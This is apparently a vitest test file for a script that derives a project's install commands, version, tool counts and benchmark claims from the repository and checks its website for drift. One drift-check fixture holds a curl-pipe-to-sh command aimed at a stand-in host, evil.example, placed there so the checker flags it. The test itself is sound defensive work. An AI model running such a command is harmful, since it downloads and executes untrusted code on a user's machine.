import { readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  applySiteMarkers,
  checkSite,
  checkSiteLines,
  deriveSiteFacts,
  factsDocument,
  renderSiteBlock,
  siteBlockNames,
  type BenchAudio,
  type SiteProblem,
} from '../scripts/site-facts.mjs';

const root = path.resolve(import.meta.dirname, '..');
const facts = deriveSiteFacts(root);
// The bench files are committed; a checkout without them is the bug.
const bench = facts.bench as {
  synthetic: { cases: number; recallBefore: string; recallAfter: string; proseChanged: number; proseTotal: number };
  audio: BenchAudio;
  compare: {
    raw: string;
    exact: string;
    exactCasing: string;
    prompt: string;
    lexicon: string;
    cleanProse: { hit: number; total: number };
    inexactTiers: { terms: number; slots: number; points: string };
  };
  terms: number;
};

describe('site facts derive from the repo source of truth', () => {
  it('reads the version and latest dated release', () => {
    const pkg = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));
    expect(facts.version).toBe(pkg.version);
    expect(facts.latestRelease?.version).toBe(pkg.version);
    expect(facts.latestRelease?.date).toMatch(/^\d{4}-\d{2}-\d{2}$/);
  });

  it('derives every install command from repository files', () => {
    expect(facts.commands.script).toBe('curl -fsSL https://ashlrai.github.io/lexicon/install.sh | sh');
    expect(facts.commands.npx).toBe('npx @ashlr/lexicon@latest setup');
    expect(facts.commands.npm).toBe('npm i -g @ashlr/lexicon');
    expect(facts.commands.brew).toBe('brew install ashlrai/tap/lexicon');
    expect(facts.commands.claudePlugin).toBe('claude plugin marketplace add ashlrai/lexicon');
    expect(facts.commands.claudePluginInstall).toBe('claude plugin install lexicon@ashlrai');
    // The installer must know its own line.
    expect(readFileSync(path.join(root, 'scripts/install.sh'), 'utf8')).toContain(facts.commands.script);
  });

  it('lists the MCP tools in registration order, and every count', () => {
    expect(facts.mcpTools).toContain('normalize_transcript');
    expect(facts.counts.tools).toBe(facts.mcpTools.length);
    expect(facts.counts.exportFormats).toBe(facts.exportFormats.length);
    expect(facts.counts.importFormats).toBe(facts.importFormats.length);
    expect(facts.words.tools).toBe('twenty-one');
    expect(facts.mcpServerConfig).toEqual({ mcpServers: { lexicon: { command: 'lexicon-mcp', args: [] } } });
    // `generic` is the paste-it-yourself path, not a named client the site lists.
    expect(facts.clients).not.toContain('generic');
  });

  it('reads the benchmark claims the pages repeat', () => {
    expect(bench.synthetic.cases).toBeGreaterThan(0);
    expect(bench.synthetic.recallBefore).toMatch(/%$/);
    expect(bench.synthetic.recallAfter).toMatch(/%$/);
    expect(bench.audio.clips).toBeGreaterThan(0);
    expect(bench.audio.lexicon.promptSmall).toMatch(/%$/);
    expect(bench.compare.lexicon).toMatch(/%$/);
    expect(bench.compare.cleanProse.total).toBeGreaterThan(0);
    expect(bench.compare.inexactTiers.slots).toBeGreaterThan(0);
    expect(bench.terms).toBeGreaterThan(0);
  });

  it('renders the facts document deterministically', () => {
    expect(JSON.stringify(factsDocument(facts))).toBe(JSON.stringify(factsDocument(deriveSiteFacts(root))));
  });
});

describe('site:* marker regions', () => {
  it('rewrites a stale inline region and reports it', () => {
    const html = `<code><!-- site:begin cmd:npm -->npm i -g @ashlr/stale<!-- site:end --></code>`;
    const out = applySiteMarkers(html, facts);
    expect(out.problems).toEqual([]);
    expect(out.blocks).toEqual([{ name: 'cmd:npm', line: 1, stale: true }]);
    expect(out.text).toBe(`<code><!-- site:begin cmd:npm -->${facts.commands.npm}<!-- site:end --></code>`);
  });

  it('leaves a fresh region byte-identical', () => {
    const html = `<code><!-- site:begin cmd:brew -->${facts.commands.brew}<!-- site:end --></code>`;
    const out = applySiteMarkers(html, facts);
    expect(out.problems).toEqual([]);
    expect(out.blocks[0].stale).toBe(false);
    expect(out.text).toBe(html);
  });

  it('renders a data-copy attribute block', () => {
    const html = `<button <!-- site:begin cmd-attr:script -->data-copy="old"<!-- site:end -->>Copy</button>`;
    const out = applySiteMarkers(html, facts);
    expect(out.text).toBe(`<button <!-- site:begin cmd-attr:script -->data-copy="${facts.commands.script}"<!-- site:end -->>Copy</button>`);
  });

  it('renders the benchmark blocks from bench truth', () => {
    expect(renderSiteBlock('bench:recallBefore', facts)).toBe(bench.synthetic.recallBefore);
    expect(renderSiteBlock('bench:proseUnchanged', facts)).toBe(
      `${bench.synthetic.proseChanged} of ${bench.synthetic.proseTotal}`,
    );
    expect(renderSiteBlock('bench:audioPromptAfter', facts)).toBe(bench.audio.lexicon.promptSmall);
    expect(renderSiteBlock('version', facts)).toBe(facts.version);
  });

  it('rejects unclosed, nested, nameless and unknown markers', () => {
    expect(applySiteMarkers(`<!-- site:begin cmd:npm -->x`, facts).problems[0].message).toMatch(/unclosed/);
    expect(
      applySiteMarkers(`<!-- site:begin cmd:npm --><!-- site:begin cmd:brew -->x<!-- site:end -->`, facts).problems[0].message,
    ).toMatch(/do not nest/);
    expect(applySiteMarkers(`<!-- site:begin -->x<!-- site:end -->`, facts).problems[0].message).toMatch(/needs a block name/);
    expect(
      applySiteMarkers(`<!-- site:begin cmd:bogus -->x<!-- site:end -->`, facts).problems[0].message,
    ).toMatch(/unknown command/);
    expect(applySiteMarkers(`<!-- site:end -->`, facts).problems[0].message).toMatch(/without a matching/);
    // Every advertised block name renders.
    for (const name of siteBlockNames()) expect(() => renderSiteBlock(name, facts)).not.toThrow();
  });
});

describe('the drift check', () => {
  it('fails when a page shows a version that is not the package version', () => {
    const p = checkSiteLines(facts, 'fixture.tsx', `const v = '0.0.0';\ntagged #v9.9.9\n<p>v0.0.0 is current</p>`);
    // '0.0.0' twice (literal), '#v9.9.9' twice (pin + literal).
    expect(p.length).toBe(4);
    expect(p.filter((x: SiteProblem) => /shows version 0\.0\.0/.test(x.message))).toHaveLength(2);
    expect(p.filter((x: SiteProblem) => /pins #v9\.9\.9/.test(x.message))).toHaveLength(1);
    expect(p.filter((x: SiteProblem) => /shows version 9\.9\.9/.test(x.message))).toHaveLength(1);
  });

  it('fails when a page shows a command that differs from source', () => {
    const cases = [
      'curl -fsSL https://evil.example/install.sh | sh',
      'npm i -g @someone/else',
      'npx @ashlr/wrongname@latest setup',
      'brew install other/tap/thing',
      'claude plugin marketplace add other/repo',
      'claude plugin install wrong@other',
    ];
    for (const line of cases) {
      const p = checkSiteLines(facts, 'fixture.tsx', `<code>${line}</code>`);
      expect(p, line).not.toHaveLength(0);
      expect(p[0].line).toBe(1);
    }
  });

  it('accepts the derived commands verbatim', () => {
    const text = Object.values(facts.commands)
      .map((c) => `<code>${c}</code>`)
      .join('\n');
    expect(checkSiteLines(facts, 'fixture.tsx', text)).toEqual([]);
  });

  it('fails on an invented install client and a wrong count', () => {
    const p = checkSiteLines(
      facts,
      'fixture.tsx',
      '`lexicon install netscape`\ntwenty-two MCP tools\nseven importers',
    );
    const messages = p.map((x: SiteProblem) => x.message).join('\n');
    expect(messages).toMatch(/'netscape'/);
    expect(messages).toMatch(/claims tools = 22/);
    expect(messages).toMatch(/claims importFormats = 7/);
  });

  it('does not flag geometry, prose or ignored lines', () => {
    const text = [
      `<path d="M5.25 4.5h13.5c.966 0 1.75.784 1.75 1.75V15.5H3.5V6.25c0-.966.784-1.75 1.75-1.75Z" />`,
      'lexicon install writes the config into each client',
      `'User-Agent': 'AppleWebKit/533.21.1 Version/5.0.5', // site-facts:ignore`,
      `${facts.counts.tools} tools`,
    ].join('\n');
    expect(checkSiteLines(facts, 'fixture.tsx', text)).toEqual([]);
  });

  it('finds no drift in the real tree', () => {
    const { problems } = checkSite(root);
    expect(problems).toEqual([]);
  });
});
